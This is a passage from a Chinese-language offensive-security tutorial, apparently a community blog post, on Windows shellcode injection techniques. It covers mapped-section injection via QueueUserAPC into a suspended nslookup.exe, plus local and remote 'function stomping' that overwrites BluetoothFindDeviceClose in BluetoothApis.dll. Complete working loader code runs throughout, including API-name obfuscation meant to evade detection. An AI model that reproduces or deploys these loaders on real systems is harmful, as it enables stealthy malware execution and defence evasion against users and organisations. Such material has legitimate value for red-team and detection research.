    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">_wcsdup</span><span class="p">(</span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">nslookup.exe"</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_VM_OPERATION</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">MapViewOfFile2</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Remote Mapping Address : 0x%p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>

    <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
</pre></div>
<p>值得注意的是调用<code>NtMapViewOfSection</code> 在微步中被标记为<code>高危行为</code></p>
<h1 data-content="1" id="0a2789af7223a335e055228c528c548e">Function Stomping Injection</h1>
<h2 data-content="1" id="12ecebe4d24d96afb960cfcc7e278c71">本地</h2>
<p>通过篡改函数 导致函数执行其它逻辑</p>
<p>首先是通过<code>loadlibrary</code>加载dll到内存 然后通过<code>GetProcAddress</code>检索地址</p>
<p>这里篡改的函数需要是非常用的 否则可能会出现问题 这里选择<code>bthprops.cpl</code>中的<code>BluetoothFindDeviceClose</code></p>
<p>首先是获取地址</p>
<div class="highlight"><pre><span></span><span class="n">LPVOID</span> <span class="n">sacrificedAddr</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="sa">L</span><span class="s">"bthprops.cpl"</span><span class="p">),</span> <span class="s">"BluetoothFindDeviceClose"</span><span class="p">);</span>
</pre></div>
<p>修改内存权限为<code>RWX</code> 写入shellcode</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112110-48117976-c726-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">DWORD</span>   <span class="n">dwOldProtection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112110-483ad442-c726-1.png"/></p>
<p>然后执行即可 这种方式避免了通过<code>VirtualAlloc</code>申请内存</p>
<p>随便怎么执行都行 这里用指针</p>
<pre><code>typedef void (*BluetoothFindDeviceClose)();
    BluetoothFindDeviceClose pFunc = (BluetoothFindDeviceClose)sacrificedAddr;
    pFunc();</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112111-48aad628-c726-1.png"/></p>
<p>可以通过静态库来避免使用<code>LoadLibrary</code> 和 <code>GetProcAddress</code></p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;bluetoothapis.h&gt;</span><span class="cp"></span>


<span class="cp">#pragma comment (lib,"Bthprops.lib")</span>
<span class="p">....</span>

<span class="n">LPVOID</span> <span class="n">sacrificedAddr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">BluetoothFindDeviceClose</span><span class="p">;</span>
<span class="n">DWORD</span>   <span class="n">dwOldProtection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">BluetoothFindDeviceClose</span><span class="p">)();</span>
<span class="n">BluetoothFindDeviceClose</span> <span class="n">pFunc</span> <span class="o">=</span> <span class="p">(</span><span class="n">BluetoothFindDeviceClose</span><span class="p">)</span><span class="n">sacrificedAddr</span><span class="p">;</span>
<span class="n">pFunc</span><span class="p">();</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112112-493a313a-c726-1.png"/></p>
<h2 data-content="1" id="d786271302e1c0437c7f1b576d863efa">远程</h2>
<p>在远程进程中必须已经载入了对应dll</p>
<p>具体步骤如下</p>
<ol>
<li>创建进程</li>
</ol>
<div class="highlight"><pre><span></span><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">)</span> <span class="p">};</span>
<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

<span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">_wcsdup</span><span class="p">(</span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">nslookup.exe"</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</pre></div>
<ol>
<li>申请内存写入dll路径</li>
</ol>
<div class="highlight"><pre><span></span><span class="n">TCHAR</span><span class="o">*</span> <span class="n">szDllPath</span> <span class="o">=</span> <span class="n">_wcsdup</span><span class="p">(</span><span class="sa">L</span><span class="s">"bthprops.cpl"</span><span class="p">);</span>
<span class="n">LPVOID</span> <span class="n">lpDllPath</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_tcslen</span><span class="p">(</span><span class="n">szDllPath</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">str1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'N'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'W'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'i'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'V'</span><span class="p">,</span><span class="sc">'i'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'u'</span><span class="p">,</span><span class="sc">'a'</span><span class="p">,</span><span class="sc">'l'</span><span class="p">,</span><span class="sc">'M'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'m'</span><span class="p">,</span><span class="sc">'o'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'y'</span><span class="p">,</span><span class="sc">'\0'</span> <span class="p">};</span>
<span class="n">pNtWriteVirtualMemory</span> <span class="n">NtWriteVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtWriteVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="n">str1</span><span class="p">);</span>

<span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpDllPath</span><span class="p">,</span> <span class="n">szDllPath</span><span class="p">,</span> <span class="n">_tcslen</span><span class="p">(</span><span class="n">szDllPath</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></div>
<ol>
<li>获取loadLibrary地址 创建远程线程调用loadLibrary加载指定dll到远程进程空间</li>
</ol>
<div class="highlight"><pre><span></span><span class="n">LPVOID</span> <span class="n">lpLoadLibrary</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryW</span><span class="p">(</span><span class="sa">L</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"LoadLibraryW"</span><span class="p">);</span>
<span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpLoadLibrary</span><span class="p">,</span> <span class="n">lpDllPath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112112-499b1ea8-c726-1.png"/></p>
<ol>
<li>修改内存属性 写入shellcode</li>
</ol>
<div class="highlight"><pre><span></span><span class="n">LPVOID</span> <span class="n">sacrificedAddr</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="sa">L</span><span class="s">"bthprops.cpl"</span><span class="p">),</span> <span class="s">"BluetoothFindDeviceClose"</span><span class="p">);</span>
<span class="n">DWORD</span>   <span class="n">dwOldProtection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">ULONG</span>  <span class="n">byteWritten</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>

    <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">sacrificedAddr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="o">&amp;</span><span class="n">byteWritten</span><span class="p">);</span>

    <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>

    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</pre></div>
<p>你会发现这样并不行</p>
<p>两个进程间dll的地址是相同的 通过调试发现 问题出在选取的函数<code>BluetoothFindDeviceClose</code></p>
<p>实际上是<code>BluetoothApis.dll</code>中的 代码里从<code>bthprops.cpl</code>找并找不到</p>
<p>前面的<code>szDllPath</code>换成<code>BluetoothApis.dll</code>就行了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112113-49c4f4b4-c726-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112113-4a3026ba-c726-1.png"/></p>
<p>完整代码</p>
<div class="highlight"><pre><span></span><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">)</span> <span class="p">};</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">TCHAR</span><span class="o">*</span> <span class="n">szDllPath</span> <span class="o">=</span> <span class="n">_wcsdup</span><span class="p">(</span><span class="sa">L</span><span class="s">"BluetoothApis.dll"</span><span class="p">);</span>

    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">_wcsdup</span><span class="p">(</span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">nslookup.exe"</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">lpDllPath</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_tcslen</span><span class="p">(</span><span class="n">szDllPath</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">str1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'N'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'W'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'i'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'V'</span><span class="p">,</span><span class="sc">'i'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'u'</span><span class="p">,</span><span class="sc">'a'</span><span class="p">,</span><span class="sc">'l'</span><span class="p">,</span><span class="sc">'M'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'m'</span><span class="p">,</span><span class="sc">'o'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'y'</span><span class="p">,</span><span class="sc">'\0'</span> <span class="p">};</span>
    <span class="n">pNtWriteVirtualMemory</span> <span class="n">NtWriteVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtWriteVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="n">str1</span><span class="p">);</span>

    <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpDllPath</span><span class="p">,</span> <span class="n">szDllPath</span><span class="p">,</span> <span class="n">_tcslen</span><span class="p">(</span><span class="n">szDllPath</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">LPVOID</span> <span class="n">lpLoadLibrary</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryW</span><span class="p">(</span><span class="sa">L</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"LoadLibraryW"</span><span class="p">);</span>

    <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpLoadLibrary</span><span class="p">,</span> <span class="n">lpDllPath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
    <span class="n">Sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span>


    <span class="n">LPVOID</span> <span class="n">sacrificedAddr</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="sa">L</span><span class="s">"BluetoothApis.dll"</span><span class="p">),</span> <span class="s">"BluetoothFindDeviceClose"</span><span class="p">);</span>
    <span class="n">DWORD</span>   <span class="n">dwOldProtection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">ULONG</span>  <span class="n">byteWritten</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>


    <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>

    <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">sacrificedAddr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="o">&amp;</span><span class="n">byteWritten</span><span class="p">);</span>

    <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">sacrificedAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>

    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">sacrificedAddr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</pre></div>
<h1 data-content="1" id="50a02d05c4e5a8948a1675c1ada6dc9d">参考</h1>
<p><a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing" target="_blank">https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection</a></p>
<p><a href="https://blog.csdn.net/xf555er/article/details/130855421" target="_blank">https://blog.csdn.net/xf555er/article/details/130855421</a></p>
<p><a href="https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp" target="_blank">https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocating" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocating</a></p>
<p><a href="https://www.henry-blog.life/henry-blog/shellcode-jia-zai-qi/jin-cheng-lou-kong-zhu-ru-kui-lei-jin-cheng#id-2.-du-queyi-cheng-xu-de-nei-rong" target="_blank">https://www.henry-blog.life/henry-blog/shellcode-jia-zai-qi/jin-cheng-lou-kong-zhu-ru-kui-lei-jin-cheng#id-2.-du-queyi-cheng-xu-de-nei-rong</a></p>
</div>
</div>